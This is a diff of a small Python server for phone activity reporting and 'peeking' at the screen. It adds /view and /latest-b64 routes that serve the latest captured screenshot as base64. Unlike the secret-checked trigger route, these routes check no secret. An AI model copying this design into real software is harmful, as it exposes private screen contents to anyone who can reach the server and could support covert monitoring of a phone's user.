@@ -1,10 +1,11 @@
 #!/usr/bin/env python3
-"""手机活动上报 + 偷看屏幕 + 触发发信。只用 Python 标准库 + smtplib。"""
+"""手机活动上报 + 偷看屏幕 + 触发发信 + view网页。只用 Python 标准库 + smtplib。"""
 
 import sqlite3
 import os
 import glob
 import cgi
+import base64
 import smtplib
 from email.mime.text import MIMEText
 from datetime import datetime, timezone, timedelta
@@ -93,6 +94,24 @@ class Handler(BaseHTTPRequestHandler):
                 return
             with open(files[0], "rb") as f:
                 self._send(200, f.read(), "image/png")
+        elif path == "/view":
+            files = sorted(glob.glob(os.path.join(SCREEN_DIR, "*.png")), reverse=True)
+            if not files:
+                self._send(404, "还没有截图".encode())
+                return
+            with open(files[0], "rb") as f:
+                b64 = base64.b64encode(f.read()).decode()
+            html = '<html><body><img src="data:image/png;base64,' + b64 + '"></body></html>'
+            self._send(200, html.encode(), "text/html; charset=utf-8")
+        elif path == "/latest-b64":
+            files = sorted(glob.glob(os.path.join(SCREEN_DIR, "*.png")), reverse=True)
+            if not files:
+                self._send(404, "还没有截图".encode())
+                return
+            with open(files[0], "rb") as f:
+                b64 = base64.b64encode(f.read()).decode()
+            self._send(200, ('{"image":"data:image/png;base64,' + b64 + '"}').encode(),
+                       "application/json; charset=utf-8")
         elif path == "/peek-trigger":
             if f"secret={PEEK_SECRET}" not in qs:
                 self._send(403, "forbidden".encode())
